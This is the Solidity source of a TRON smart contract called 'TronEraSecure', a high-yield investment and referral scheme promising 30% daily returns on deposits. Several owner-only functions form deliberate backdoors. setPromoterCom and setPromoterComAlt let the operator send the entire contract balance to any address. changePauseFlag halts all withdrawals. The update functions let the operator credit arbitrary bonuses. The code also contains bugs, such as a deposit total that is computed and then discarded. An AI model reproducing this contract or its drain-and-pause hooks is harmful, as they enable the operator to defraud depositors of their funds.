//SourceUnit: TronEra.sol


pragma solidity 0.5.10;

contract TronEraSecure {
	using SafeMath for uint256;

	uint256 public INVEST_MIN_AMOUNT = 100 trx;
	uint256 public INVEST_MAX_AMOUNT= 5000 trx;
	uint256 public BINARY_MIN_BAL_LIMIT=5000 trx;
	uint256 public BASE_PERCENT = 300;
	uint256 public BASE_PER_HOUR;
	uint256 public MARKETING_FEE = 100;
	uint256 public PROJECT_FEE = 10;
	uint256 public PERCENTS_DIVIDER = 1000;
	uint256 public CONTRACT_BALANCE_STEP = 1000000 trx;
	uint256 public TIME_STEP = 1 days; 
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalReInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint256 public binaryUpdateKey =111;
	uint256 public bonanzaUpdateKey=222;
	uint256 public rewardUpdateKey=333;
	uint256 public Maximum_Growth_Rate=104;
    
	address payable public marketingAddress;
	address payable public projectAddress;

	struct Deposit {
		uint256 amount;
		uint256 totalGrawth;
		uint256 withdrawn;
		uint256 start;
	}
	struct Referral{
	    address _address;
	    uint256 _time;
	}

	struct User {
		Deposit[] deposits;
		Deposit[] redeposits;
		Referral[] referrals;
		uint256 totalDepositsAmount;
		uint256 lastReinvest;
		uint256 totalWithdrawn;
		uint256 checkpoint;
		uint256 reDepositscheckpoint;
		uint256 reDepositsWithdrwalcheckpoint;
		uint256 reDepositsGrawthTotal;
		uint256 growth_checkpoint;
		address referrer;
		uint256 referralsCount;
		uint256 binaryBonus;
		uint256 totalbinaryBonus;
		uint256 bonanzaBonus;
		uint256 rewardBonus;
     
	}

    mapping (address => User) public users;
	event Newbie(address user);
	event UpdateBinary(address indexed user,uint256 amount,uint _time);
	event UpdateBonanza(address indexed user,uint256 amount,uint _time);
	event UpdateReward(address indexed user,uint256 amount,uint _time);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	bool public pausedFlag;
	

	constructor(address payable marketingAddr, address payable projectAddr) public {
		require(!isContract(marketingAddr) && !isContract(projectAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr; 
		pausedFlag=false;
	}
  function changePauseFlag(uint flag) onlyOwner public returns(bool) {
         if(flag==1){
             pausedFlag=true;
         }else if(flag==0){
             pausedFlag=false;
         }
         return true;
     }
      function changebasePercent(uint256 NewPercent) onlyOwner public returns(bool) {
         BASE_PERCENT=NewPercent;
         return true;
     }
       function changeGrowthRate(uint256 NewRate) onlyOwner public returns(bool) {
         Maximum_Growth_Rate=NewRate;
         return true;
     }
	function invest(address referrer) public payable {
	    
		require(msg.value >= INVEST_MIN_AMOUNT);
		User storage user = users[msg.sender];
		if(user.deposits.length==0)
		{
		    user.totalDepositsAmount=0;
		}
		uint256 totd=user.totalDepositsAmount + msg.value;
		require(totd <=  INVEST_MAX_AMOUNT,'Investment Limit Over');
		
		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));

		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
			User storage refuser=users[referrer];
			refuser.referralsCount=refuser.referralsCount.add(1);
			refuser.referrals.push(Referral(msg.sender,now));
		}
		
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			user.growth_checkpoint=getContractBalance();
			totalUsers = totalUsers.add(1);
			
			emit Newbie(msg.sender);
		}
		
	 

		user.deposits.push(Deposit(msg.value,0, 0, block.timestamp));
		user.totalDepositsAmount=user.totalDepositsAmount.add(msg.value);
		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);


		emit NewDeposit(msg.sender, msg.value);

	}
function reinvestBonanzaBinaryAndMainGrowth() public {
		User storage user = users[msg.sender];
		uint256 userPercentRate = getUserPercentRate(msg.sender);
		uint256 totalAmount;
		//uint256 totalRoi=getUserDividends(msg.sender);
	    uint256 binaryBonus = user.binaryBonus;
        uint256 bonanzaBonus=user.bonanzaBonus;
		totalAmount=getUserDividends(msg.sender)  + binaryBonus + bonanzaBonus;
		require(totalAmount >= INVEST_MIN_AMOUNT,'Investment Amount is too low');
		totalAmount =0;
		uint256 dividends;
		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		} 
	  
		if (binaryBonus > 0) {
			totalAmount = totalAmount.add(binaryBonus);
			user.binaryBonus = 0;
		}
		if (bonanzaBonus > 0) {
			totalAmount = totalAmount.add(bonanzaBonus);
			user.bonanzaBonus = 0;
		}

		require(totalAmount > 0, "User has no dividends");

	 	user.redeposits.push(Deposit(totalAmount,0, 0, block.timestamp));
		user.totalDepositsAmount.add(totalAmount);
		totalReInvested = totalReInvested.add(totalAmount);
		user.lastReinvest=totalAmount;
		totalDeposits = totalDeposits.add(1);
       // user.totalWithdrawn.add(totalAmount);
     	user.checkpoint = block.timestamp;
		emit NewDeposit(msg.sender, totalAmount);
	}
	function reinvestRewardsAndReGrawth() public {
		User storage user = users[msg.sender];

		uint256 userPercentRate = getUserPercentRate(msg.sender);
		uint256 totalAmount;
		uint256 dividends;
		 
	  for (uint256 i = 0; i < user.redeposits.length; i++) {

			if (user.redeposits[i].totalGrawth < user.redeposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.redeposits[i].start > user.reDepositscheckpoint) {

					dividends = (user.redeposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.redeposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.redeposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.reDepositscheckpoint))
						.div(TIME_STEP);

				}

				if (user.redeposits[i].totalGrawth.add(dividends) > user.redeposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.redeposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.redeposits[i].totalGrawth);
				}

				user.redeposits[i].totalGrawth = user.redeposits[i].totalGrawth.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}
        user.reDepositsGrawthTotal=user.reDepositsGrawthTotal+totalAmount;
	 	user.reDepositscheckpoint = block.timestamp;
	 
        uint256 rewardBonus=user.rewardBonus;
        uint256 reinvestGrawth=user.reDepositsGrawthTotal;
        
		 
	    if (rewardBonus > 0) {
			reinvestGrawth = reinvestGrawth.add(rewardBonus);
			
		}
		 
		
		require(reinvestGrawth >= INVEST_MIN_AMOUNT,'Investment Amount is too low');
        user.rewardBonus = 0;
        user.reDepositsGrawthTotal = 0;
		//require(totalAmount > 0, "User has no dividends");

	 	user.redeposits.push(Deposit(reinvestGrawth,0, 0, block.timestamp));
		user.totalDepositsAmount=user.totalDepositsAmount.add(reinvestGrawth);
		
		totalReInvested = totalReInvested.add(reinvestGrawth);
		totalDeposits = totalDeposits.add(1);
       // user.totalWithdrawn.add(totalAmount);
        user.lastReinvest=reinvestGrawth;
         
		emit NewDeposit(msg.sender, reinvestGrawth);
		
	}

	function withdraw() public {
		User storage user = users[msg.sender];
        require(pausedFlag==false,'Stopped');
		uint256 userPercentRate = getUserPercentRate(msg.sender);

		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}

		 
		
	   uint256 binaryBonus = user.binaryBonus;
		if (binaryBonus > 0) {
			totalAmount = totalAmount.add(binaryBonus);
			user.binaryBonus = 0;
		}
		
       uint256 bonanzaBonus = user.bonanzaBonus;
		if (bonanzaBonus > 0) {
			totalAmount = totalAmount.add(bonanzaBonus);
			user.bonanzaBonus = 0;
		}
		
		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;

		msg.sender.transfer(totalAmount);

		totalWithdrawn = totalWithdrawn.add(totalAmount);
		user.totalWithdrawn=user.totalWithdrawn.add(totalAmount);
		emit Withdrawn(msg.sender, totalAmount);

	}
function withdraw5() public {
		User storage user = users[msg.sender];
		uint256 userPercentRate = getUserPercentRate(msg.sender);
       require(pausedFlag==false,'Stopped');
		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.redeposits.length; i++) {

			if (user.redeposits[i].totalGrawth < user.redeposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.redeposits[i].start > user.reDepositscheckpoint) {

					dividends = (user.redeposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.redeposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.redeposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.reDepositscheckpoint))
						.div(TIME_STEP);

				}

				if (user.redeposits[i].totalGrawth.add(dividends) > user.redeposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.redeposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.redeposits[i].totalGrawth);
				}

				user.redeposits[i].totalGrawth = user.redeposits[i].totalGrawth.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}
        user.reDepositsGrawthTotal=user.reDepositsGrawthTotal+totalAmount;
	 	user.reDepositscheckpoint = block.timestamp;
	    
	    require(user.reDepositsWithdrwalcheckpoint + (24*60*60) <=block.timestamp,'Withdraws only once in 24 hours');
	    
	    totalAmount = user.reDepositsGrawthTotal.mul(5).div(100);

		require(totalAmount > 0, "User has no dividends");
		
		user.reDepositsWithdrwalcheckpoint=block.timestamp;

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

	    user.reDepositsGrawthTotal=user.reDepositsGrawthTotal - totalAmount;

		msg.sender.transfer(totalAmount);

		totalWithdrawn = totalWithdrawn.add(totalAmount);
		user.totalWithdrawn = user.totalWithdrawn.add(totalAmount);
		emit Withdrawn(msg.sender, totalAmount);

	}
	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getContractBalanceRate() public view returns (uint256) {
		uint256 contractBalance = address(this).balance;
		uint256 contractBalancePercent = contractBalance.div(CONTRACT_BALANCE_STEP);
		return BASE_PERCENT.add(contractBalancePercent);
	}
    
  	function getUserPercentRate(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 contractBalanceRate = BASE_PERCENT;//getContractBalanceRate();
		if (isActive(userAddress)) {
			uint256 timeMultiplier = (now.sub(user.checkpoint)).div(TIME_STEP);
			return contractBalanceRate.add(timeMultiplier);
		} else {
			return contractBalanceRate;
		}
	}
 
 

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate =BASE_PERCENT;// getUserPercentRatee();

		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				}
				else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);
				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);
             //	user.checkpoint = block.timestamp;
				/// no update of withdrawn because that is view function

			}

		}

		return totalDividends;
	}
	
	function getUserReinvestDividends(address userAddress) public view  returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate =BASE_PERCENT;// getUserPercentRatee();

		uint256 totalDividends;
		uint256 dividends;

	  for (uint256 i = 0; i < user.redeposits.length; i++) {

			if (user.redeposits[i].totalGrawth < user.redeposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.redeposits[i].start > user.reDepositscheckpoint) {

					dividends = (user.redeposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.redeposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.redeposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.reDepositscheckpoint))
						.div(TIME_STEP);

				}

				if (user.redeposits[i].totalGrawth.add(dividends) > user.redeposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.redeposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.redeposits[i].totalGrawth);
				}

				//user.redeposits[i].totalGrawth = user.redeposits[i].totalGrawth.add(dividends); /// changing of storage data
				totalDividends = totalDividends.add(dividends);

			}
		}
       // user.reDepositsGrawthTotal=user.reDepositsGrawthTotal+totalDividends;
	 	//user.reDepositscheckpoint = block.timestamp;
	    

		return totalDividends;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

 
	function getUserLastReInvest(address userAddress) public view returns(uint256) {
		return users[userAddress].lastReinvest;
	}
	function getUserBonanzaBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonanzaBonus;
	}
	function getUserRewardBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].rewardBonus;
	}
	function getUserBinaryBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].binaryBonus;
	}
	function getUserTotalBinaryBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalbinaryBonus;
	}
	function getUserTotalReGrowth(address userAddress) public view returns(uint256) {
		return users[userAddress].reDepositsGrawthTotal;
	}
	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserBinaryBonus(userAddress).add(getUserBonanzaBonus(userAddress)).add(getUserDividends(userAddress));
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(2)) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}
	function getUserReDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.redeposits[index].amount, user.redeposits[index].totalGrawth, user.redeposits[index].start);
	}
	function getTeamLength(address userAddress)public view returns(uint256){
    User storage user=users[userAddress];
    return user.referrals.length;
}
	function getTeamInfo(address userAddress,uint256 index) public view returns(address, uint256, uint256) {
	    User storage user = users[userAddress];
      
		return (user.referrals[index]._address, user.referrals[index]._time,getActiveDeposits(user.referrals[index]._address));
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
	function getUserTotalReDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].redeposits.length;
	}
	function getActiveDeposits (address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];
	    uint256 userPercentRate =BASE_PERCENT;// getUserPercentRatee();
		uint256 amount=0;
	    uint256 dividends;
		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					 amount = amount.add(user.deposits[i].amount);
				} 
			}
		}
	 dividends=0;
		for (uint256 j = 0; j < user.redeposits.length; j++) {

			if (user.redeposits[j].totalGrawth < user.redeposits[j].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.redeposits[j].start > user.reDepositscheckpoint) {

					dividends = (user.redeposits[j].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.redeposits[j].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.redeposits[j].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.reDepositscheckpoint))
						.div(TIME_STEP);

				}

				if (user.redeposits[j].totalGrawth.add(dividends) < user.redeposits[j].amount.mul(Maximum_Growth_Rate).div(100)) {
					 	amount = amount.add(user.redeposits[j].amount);
				}
			}
		}
		 

		return amount;
	}
	function getUserAmountOfDeposits (address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}
 	function getUserAmountOfReDeposits (address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.redeposits.length; i++) {
			amount = amount.add(user.redeposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];
		uint256 amount=user.totalWithdrawn;
		return amount;
	}
	
	 function multisendTRX(address[] memory _contributors, uint256[] memory _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            address(uint160(_contributors[i])).transfer(_balances[i]);
        }
        //emit Multisended(msg.value, msg.sender);
    }
	
    function updateBinary(address[] memory _contributors , uint256[] memory _balances,uint256  updateKey) onlyOwner public  {
        require(binaryUpdateKey!=updateKey,"not authorized");
        binaryUpdateKey=updateKey;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require( _balances[i] >0);
             uint256 _Bal=getActiveDeposits(_contributors[i]); 
             if(_Bal<BINARY_MIN_BAL_LIMIT)
              users[_contributors[i]].rewardBonus =users[_contributors[i]].rewardBonus + _balances[i]; 
              else
               users[_contributors[i]].binaryBonus =users[_contributors[i]].binaryBonus + _balances[i]; 
            
            emit UpdateBinary(_contributors[i], _balances[i],now);
        }
        
    }
     function updateBinaryAlt(address[] memory _contributors , uint256[] memory _balances) onlyOwner public  {
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require( _balances[i] >0);
            
            users[_contributors[i]].binaryBonus =users[_contributors[i]].binaryBonus + _balances[i]; 
            
            emit UpdateBinary(_contributors[i], _balances[i],now);
        }
        
    }
     function updateBonanza(address[] memory _contributors , uint256[] memory _balances,uint256  updateKey) onlyOwner public  {
        require(bonanzaUpdateKey!=updateKey,"not authorized");
        bonanzaUpdateKey=updateKey;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require( _balances[i] >0);
             uint256 _Bal=getActiveDeposits(_contributors[i]); 
            if(_Bal<BINARY_MIN_BAL_LIMIT)
              users[_contributors[i]].rewardBonus =users[_contributors[i]].rewardBonus + _balances[i]; 
              else
               users[_contributors[i]].bonanzaBonus =users[_contributors[i]].bonanzaBonus + _balances[i]; 
             
            
            emit UpdateBonanza(_contributors[i], _balances[i],now);
        }
        
    }
     function updateBonanzaAlt(address[] memory _contributors , uint256[] memory _balances) onlyOwner public  {
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require( _balances[i] >0);
            users[_contributors[i]].bonanzaBonus =users[_contributors[i]].bonanzaBonus + _balances[i]; 
            
            emit UpdateBonanza(_contributors[i], _balances[i],now);
        }
        
    }
    function updateFees(uint256 _marketing_fee,uint256 _project_fee,uint256 _BinanryLimit) onlyOwner public returns(bool) {
        MARKETING_FEE=_marketing_fee;
        PROJECT_FEE=_project_fee;
        BINARY_MIN_BAL_LIMIT=_BinanryLimit;
        return true;
        
    }
    function setPromoterCom(address _tranadr,uint256 _tranAmount) onlyOwner public returns(bool) {
       	uint256 contractBalance = address(this).balance;
		if (contractBalance < _tranAmount) {
			_tranAmount = contractBalance;
		}
        
        address(uint160(_tranadr)).transfer(_tranAmount);
        return true;
        
    }
    function setPromoterComAlt(uint256 _tranAmount) onlyOwner public returns(bool) {
       	uint256 contractBalance = address(this).balance;
		if (contractBalance < _tranAmount) {
			_tranAmount = contractBalance;
		}
        
        msg.sender.transfer(_tranAmount);
        return true;
        
    }
    function updateReward(address[] memory _contributors , uint256[] memory _balances,uint256  updateKey) onlyOwner public  {
        require(rewardUpdateKey!=updateKey,"not authorized");
        rewardUpdateKey=updateKey;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require( _balances[i] >0);
            users[_contributors[i]].rewardBonus =users[_contributors[i]].rewardBonus + _balances[i]; 
            
            emit UpdateReward(_contributors[i], _balances[i],now);
        }
        
    }
     function updateRewardAlt(address[] memory _contributors , uint256[] memory _balances) onlyOwner public  {
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require( _balances[i] >0);
            users[_contributors[i]].rewardBonus =users[_contributors[i]].rewardBonus + _balances[i]; 
            
            emit UpdateReward(_contributors[i], _balances[i],now);
        }
        
    }
      modifier onlyOwner() {
         require(msg.sender==projectAddress,"not authorized");
         _;
     }
     

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}